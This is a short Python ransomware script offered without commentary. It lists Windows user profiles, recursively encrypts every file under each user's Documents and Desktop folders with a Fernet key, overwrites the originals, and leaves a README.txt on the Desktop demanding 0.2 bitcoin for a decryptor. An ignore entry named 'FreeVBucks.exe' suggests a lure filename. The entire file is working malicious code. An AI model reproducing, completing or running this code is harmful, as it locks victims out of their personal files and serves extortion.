import os
from cryptography.fernet import Fernet


# TODO WINDOW WITH WARNING AND KEY


def main():
    backslash = "\\"
    base_path = "C:" + backslash + "Users"
    ignore = ['A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe', "All Users", "Default",
              "Default User", "desktop.ini", "Public"]
    key = Fernet.generate_key()
    f = Fernet(key)

    users = get_users(base_path, backslash, ignore)
    directories = set_directories(users, backslash)
    loop(directories, ignore, f)
    write_readme(users[0], key.decode())


def get_users(base_path: str, backslash: str, ignore: list[str]):
    users = []
    for dir in os.listdir(base_path):
        if dir in ignore:
            continue
        else:
            users.append(base_path + backslash + dir)
    return users


def set_directories(users: list[str], backslash: str):
    directories = []
    for user in users:
        directories.append(user + backslash + "Documents")
        directories.append(user + backslash + "Desktop")
    return directories


def loop(directories: list[str], ignore: list[str], f: Fernet):
    aux_directories = []
    while len(directories) != 0:
        for directory in directories:
            if os.path.exists(directory) and os.path.isdir(directory):
                for file in os.listdir(directory):
                    if file in ignore:
                        continue
                    if os.path.isfile(directory + "\\" + file):
                        read(directory + "\\" + file, f)
                    if os.path.isdir(directory + "\\" + file):
                        aux_directories.append(directory + "\\" + file)
        directories.clear()
        directories = aux_directories.copy()
        aux_directories.clear()


def read(file_path: str, f: Fernet):
    with open(file_path, "rb") as file:
        content = file.read()
    magic(content, file_path, f)


def magic(content, file_path: str, f: Fernet):
    e_content = f.encrypt(content)
    with open(file_path, "wb") as file:
        file.write(e_content)


def write_readme(username: str, key: str):
    with open(username + "\\" + "Desktop" + "\\" + "README.txt", "w") as file:
        file.write(
            f'Your files have been encrypted, send 0.2 bitcoin to my bank account, and I will give you the decryptor. KEY: {key}')


if __name__ == "__main__":
    main()
